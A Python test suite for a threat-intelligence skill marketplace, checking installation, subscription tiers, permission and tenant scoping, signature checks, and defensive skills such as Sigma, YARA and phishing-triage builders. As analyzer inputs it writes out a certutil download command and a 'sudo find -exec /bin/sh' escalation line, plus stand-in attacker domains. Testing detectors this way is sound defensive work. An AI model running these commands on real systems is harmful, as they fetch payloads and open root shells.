import json

from app.database import SessionLocal
from app.models import SkillPackage, User


def login(client, username: str, password: str = "StrongPass123!") -> None:
    response = client.post("/api/auth/login", json={"username": username, "password": password})
    assert response.status_code == 200


def create_market_skill(skill_key: str = "market-test", required: list[str] | None = None) -> int:
    with SessionLocal() as db:
        skill = SkillPackage(
            skill_key=skill_key,
            name="Market Test",
            version="1.0.0",
            description="A verified marketplace skill",
            author="Cipher",
            permissions_json='["threat_intel.lookup_ioc"]',
            review_status="verified",
            enabled=True,
            release_status="published",
            signature_status="verified",
            manifest_json=json.dumps({
                "inputs": {"required": required or ["iocs"]},
                "marketplace": {"category": "threat-intelligence", "tags": ["IOC"], "pricing": "included", "featured": True},
            }),
        )
        db.add(skill); db.commit(); db.refresh(skill)
        return skill.id


def test_marketplace_install_filter_and_uninstall(client, create_user) -> None:
    create_user(username="skill-user", password="StrongPass123!")
    skill_id = create_market_skill()
    login(client, "skill-user")

    item = client.get("/api/skills").json()["items"][0]
    assert item["installed"] is False
    assert item["category"] == "threat-intelligence"
    assert item["featured"] is True
    assert item["installCount"] == 0

    installed = client.post(f"/api/skills/{skill_id}/install")
    assert installed.status_code == 201
    assert installed.json()["installed"] is True
    assert installed.json()["installCount"] == 1
    assert [value["id"] for value in client.get("/api/skills?installed=true").json()["items"]] == [skill_id]

    removed = client.delete(f"/api/skills/{skill_id}/install")
    assert removed.status_code == 200
    assert removed.json()["installed"] is False


def test_skill_requires_installation_before_run(client, create_user) -> None:
    create_user(username="skill-runner", password="StrongPass123!")
    skill_id = create_market_skill()
    login(client, "skill-runner")

    blocked = client.post(f"/api/skills/{skill_id}/runs", json={"input": {"iocs": []}})
    assert blocked.status_code == 409
    assert "先安装" in blocked.json()["detail"]

    client.post(f"/api/skills/{skill_id}/install")
    completed = client.post(f"/api/skills/{skill_id}/runs", json={"input": {"iocs": []}})
    assert completed.status_code == 201
    assert completed.json()["status"] == "completed"
    history = client.get("/api/skills/history")
    assert history.status_code == 200
    assert history.json()["items"][0]["id"] == completed.json()["id"]


def test_conversation_skill_persists_messages_and_checks_ownership(
    client, create_user, create_conversation_for_user
) -> None:
    owner = create_user(username="conversation-skill-owner", password="StrongPass123!")
    create_user(username="conversation-skill-other", password="StrongPass456!")
    conversation = create_conversation_for_user(user=owner, title="IOC investigation")
    skill_id = create_market_skill("ioc-enrichment")

    login(client, "conversation-skill-owner")
    assert client.post(f"/api/skills/{skill_id}/install").status_code == 201
    completed = client.post(
        f"/api/skills/{skill_id}/runs",
        json={
            "conversationId": conversation.id,
            "prompt": "/ioc 8.8.8.8",
            "input": {"iocs": ["8.8.8.8"]},
        },
    )

    assert completed.status_code == 201, completed.text
    persisted = completed.json()["conversationMessages"]
    assert [item["role"] for item in persisted] == ["user", "assistant"]
    assert persisted[0]["content"] == "/ioc 8.8.8.8"
    assert "Market Test" in persisted[1]["content"]
    assert "ioc-enrichment" in persisted[1]["content"]
    history = client.get(f"/api/conversations/{conversation.id}/messages")
    assert history.status_code == 200
    assert [item["content"] for item in history.json()["items"]] == [
        persisted[0]["content"], persisted[1]["content"]
    ]

    login(client, "conversation-skill-other", password="StrongPass456!")
    assert client.post(f"/api/skills/{skill_id}/install").status_code == 201
    forbidden = client.post(
        f"/api/skills/{skill_id}/runs",
        json={"conversationId": conversation.id, "input": {"iocs": ["8.8.8.8"]}},
    )
    assert forbidden.status_code == 404


def test_professional_skill_requires_matching_entitlement(client, create_user) -> None:
    user = create_user(username="standard-skill-user", password="StrongPass123!")
    with SessionLocal() as db:
        skill = SkillPackage(
            skill_key="paid-skill", name="Paid", version="1.0.0", enabled=True,
            review_status="verified", permissions_json="[]", release_status="published", signature_status="verified",
            manifest_json=json.dumps({"marketplace": {"pricing": "professional"}}),
        )
        db.add(skill); db.commit(); db.refresh(skill); skill_id = skill.id
    login(client, "standard-skill-user")
    assert client.post(f"/api/skills/{skill_id}/install").status_code == 403
    with SessionLocal() as db:
        db.get(User, user.id).subscription_tier = "professional"
        db.commit()
    assert client.post(f"/api/skills/{skill_id}/install").status_code == 201


def test_skill_run_validates_permissions_and_tenant_scope(client, create_user) -> None:
    user = create_user(username="scoped-skill-user", password="StrongPass123!")
    skill_id = create_market_skill("scoped-skill")
    login(client, "scoped-skill-user")
    assert client.post(f"/api/skills/{skill_id}/install").status_code == 201

    denied_permission = client.post(f"/api/skills/{skill_id}/runs", json={
        "input": {"iocs": []}, "approvedPermissions": []
    })
    assert denied_permission.status_code == 201
    denied_permission = client.post(f"/api/skills/{skill_id}/runs", json={
        "input": {"iocs": []}, "approvedPermissions": ["network:not-approved"]
    })
    assert denied_permission.status_code == 403

    denied_user = client.post(f"/api/skills/{skill_id}/runs", json={
        "input": {"iocs": [], "ownerUserId": user.id + 1},
        "approvedPermissions": ["threat_intel.lookup_ioc"],
    })
    assert denied_user.status_code == 403
    assert "其他用户" in denied_user.json()["detail"]


def test_invalid_skill_signature_cannot_be_enabled_or_run(client, create_user) -> None:
    create_user(username="signature-admin", password="StrongPass123!", is_admin=True)
    with SessionLocal() as db:
        skill = SkillPackage(skill_key="tampered", name="Tampered", version="1.0.0", enabled=False,
            release_status="published", review_status="needs_review", signature_status="invalid",
            permissions_json="[]", manifest_json='{"inputs": {}}')
        db.add(skill); db.commit(); db.refresh(skill); skill_id = skill.id
    login(client, "signature-admin")
    reviewed = client.post(f"/api/skills/{skill_id}/review", json={"status": "verified"})
    assert reviewed.status_code == 409
    enabled = client.patch(f"/api/skills/{skill_id}", json={"enabled": True})
    assert enabled.status_code == 409


def test_builtin_sync_publishes_product_skills_and_refreshes_metadata(client, create_user) -> None:
    create_user(username="skill-admin", password="StrongPass123!", is_admin=True)
    login(client, "skill-admin")
    synced = client.post("/api/skills/sync")
    assert synced.status_code == 200
    by_key = {item["key"]: item for item in synced.json()["items"]}
    assert {
        "ioc-enrichment", "sigma-rule-builder", "yara-rule-builder", "cape-to-stix",
        "attack-technique-mapper", "phishing-triage", "firewall-blocklist-builder",
        "incident-brief-builder", "evidence-integrity-checker",
        "capa-capability-review", "lolbas-command-analyzer", "gtfobins-command-analyzer",
        "nuclei-template-planner",
    } <= set(by_key)
    assert by_key["cape-to-stix"]["sourceUrl"] == "https://github.com/idaholab/cape2stix"
    assert by_key["sigma-rule-builder"]["category"] == "detection-engineering"
    assert by_key["yara-rule-builder"]["pricing"] == "professional"
    assert all(by_key[key]["reviewStatus"] == "verified" for key in by_key)

    second_sync = client.post("/api/skills/sync")
    assert second_sync.status_code == 200
    assert second_sync.json()["added"] == 0


def test_sigma_yara_and_stix_skills_generate_reviewable_outputs(client, create_user) -> None:
    create_user(username="skill-analyst", password="StrongPass123!")
    login(client, "skill-analyst")
    cases = [
        ("sigma-rule-builder", ["title", "logsource", "indicators"], {
            "title": "Suspicious DNS", "logsource": "dns", "indicators": ["evil.example", "8.8.8.8"]
        }),
        ("yara-rule-builder", ["name", "strings"], {
            "name": "123 bad-rule", "strings": ["unique malware marker", "another marker", "third marker"]
        }),
        ("cape-to-stix", ["report"], {
            "report": {"sha256": "a" * 64, "domains": ["evil.example"], "urls": ["https://evil.example/a"]}
        }),
    ]
    outputs = {}
    for key, required, payload in cases:
        skill_id = create_market_skill(key, required)
        client.post(f"/api/skills/{skill_id}/install")
        response = client.post(f"/api/skills/{skill_id}/runs", json={"input": payload})
        assert response.status_code == 201
        outputs[key] = response.json()["output"]

    assert "status: experimental" in outputs["sigma-rule-builder"]["content"]
    assert outputs["sigma-rule-builder"]["validation"]["requiresHumanReview"] is True
    assert "rule cipher_rule_123_bad_rule" in outputs["yara-rule-builder"]["content"]
    assert outputs["yara-rule-builder"]["stringCount"] == 3
    assert outputs["cape-to-stix"]["format"] == "stix-2.1"
    assert outputs["cape-to-stix"]["objectCount"] == 3


def test_new_case_skills_produce_actionable_outputs(client, create_user) -> None:
    create_user(username="case-skill-admin", password="StrongPass123!", is_admin=True)
    login(client, "case-skill-admin")
    synced = client.post("/api/skills/sync").json()["items"]
    by_key = {item["key"]: item for item in synced}
    payloads = {
        "attack-technique-mapper": {"behaviors": ["PowerShell executed an encoded command", "unknown behavior"]},
        "phishing-triage": {"sender": "attacker.example", "subject": "Urgent password reset", "authentication": "dmarc=fail", "urls": ["https://evil.example"], "attachments": ["invoice.js"], "body": "login immediately"},
        "firewall-blocklist-builder": {"indicators": ["8.8.8.8", "evil.example", "a" * 64], "ticket": "CHG-1", "expiresHours": 48},
        "incident-brief-builder": {"title": "Malware incident", "severity": "high", "summary": "One host affected", "indicators": ["evil.example"], "actions": ["Host isolated"]},
        "evidence-integrity-checker": {"evidence": [{"id": 1, "reviewStatus": "verified", "contentHash": "a" * 64, "confidence": 90, "sourceTrust": 90}]},
    }
    outputs = {}
    for key, payload in payloads.items():
        skill_id = by_key[key]["id"]
        assert client.patch(f"/api/skills/{skill_id}", json={"enabled": True}).status_code == 200
        assert client.post(f"/api/skills/{skill_id}/install").status_code == 201
        response = client.post(f"/api/skills/{skill_id}/runs", json={"input": payload})
        assert response.status_code == 201, response.text
        outputs[key] = response.json()["output"]
    assert outputs["attack-technique-mapper"]["mappedCount"] >= 1
    assert outputs["phishing-triage"]["risk"] in {"high", "critical"}
    assert outputs["firewall-blocklist-builder"]["entryCount"] == 2
    assert outputs["incident-brief-builder"]["requiresHumanReview"] is True
    assert outputs["evidence-integrity-checker"]["readyForSigning"] is True


def test_github_ecosystem_skills_keep_upstream_metadata_and_safe_outputs(client, create_user) -> None:
    create_user(username="github-skill-admin", password="StrongPass123!", is_admin=True)
    login(client, "github-skill-admin")
    items = client.post("/api/skills/sync").json()["items"]
    by_key = {item["key"]: item for item in items}
    expected = {
        "capa-capability-review": ("Mandiant FLARE Team", "9.4.0-cipher.1", "https://github.com/mandiant/capa"),
        "lolbas-command-analyzer": ("LOLBAS Project", "snapshot-3403b338875b", "https://github.com/LOLBAS-Project/LOLBAS"),
        "gtfobins-command-analyzer": ("GTFOBins Project", "snapshot-acd524623f9c", "https://github.com/GTFOBins/GTFOBins.github.io"),
        "nuclei-template-planner": ("ProjectDiscovery", "10.4.7-cipher.1", "https://github.com/projectdiscovery/nuclei-templates"),
    }
    for key, (author, version, source_url) in expected.items():
        assert by_key[key]["author"] == author
        assert by_key[key]["version"] == version
        assert by_key[key]["sourceUrl"] == source_url
        assert by_key[key]["reviewStatus"] == "verified"
        client.patch(f"/api/skills/{by_key[key]['id']}", json={"enabled": True})
        client.post(f"/api/skills/{by_key[key]['id']}/install")

    payloads = {
        "capa-capability-review": {"capabilities": ["execute PowerShell", "capture screenshot", "HTTP communication"]},
        "lolbas-command-analyzer": {"commands": ["certutil.exe -urlcache https://example.test/a payload.bin"]},
        "gtfobins-command-analyzer": {"commands": ["sudo find / -exec /bin/sh \\;"]},
        "nuclei-template-planner": {"assets": ["https://app.example.test"], "severities": ["critical", "high"], "tags": ["cve"], "rateLimit": 10, "authorizationConfirmed": True},
    }
    outputs = {}
    for key, payload in payloads.items():
        response = client.post(f"/api/skills/{by_key[key]['id']}/runs", json={"input": payload})
        assert response.status_code == 201, response.text
        outputs[key] = response.json()["output"]
    assert outputs["capa-capability-review"]["capabilityCount"] == 3
    assert outputs["lolbas-command-analyzer"]["matchCount"] == 1
    assert outputs["gtfobins-command-analyzer"]["matches"][0]["elevatedContext"] is True
    assert outputs["nuclei-template-planner"]["controls"]["executesScan"] is False
